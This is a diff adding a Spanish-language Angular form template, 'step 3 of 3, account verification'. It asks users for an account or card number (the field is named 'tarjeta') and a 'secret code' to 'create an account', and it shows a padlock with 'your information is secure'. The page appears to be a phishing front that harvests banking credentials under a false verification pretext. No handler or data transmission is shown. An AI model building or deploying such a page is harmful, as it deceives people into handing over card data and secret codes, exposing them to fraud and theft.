@@ -1,0 +1,52 @@
+<div class="superior2">
+    
+    <a href="/">
+        <div class="anterior">
+            <i class="fas fa-chevron-left"></i>
+            <p>Volver</p>
+        </div>
+    </a>
+
+    <div class="posterior">
+        <p class="paso">Paso 03/03</p>
+        <p class="pi">Verificación de cuenta</p>
+    </div>
+
+</div>
+
+<div class="navegacion">
+    
+    <div class="presentacion">
+        <p class="unete">Completa tu perfil.</p>
+        <p class="paraempezar">Para poder revisar que se trata de una cuenta real, precisamos de la siguiente información</p>
+    </div>
+    
+    <div class="formulario1">
+        <form autocomplete="off" [formGroup]="form3" (ngSubmit)="avanzar()" >
+            
+            <div class="objform" >
+                <label>número de cuenta *</label>
+                <i class="fas fa-check-circle" *ngIf="cccheck('tarjeta')" ></i>
+                <input type="text" formControlName="tarjeta" class="cci">
+            </div>
+            
+
+            <div class="objform" >
+                <label>Código secreto *</label>
+                <i class="fas fa-check-circle" *ngIf="cccheck('ns')"></i>
+                <input type="text" formControlName="ns" class="cci">
+            </div>
+            
+
+            <div class="objform">
+                <button type="submit" class="botonsubmit">Crear cuenta</button>
+            </div>
+        
+        </form>
+    </div>
+
+    
+
+</div>
+
+<div class="infosegura"><p><i class="fas fa-lock"></i>Tu información es segura</p></div>
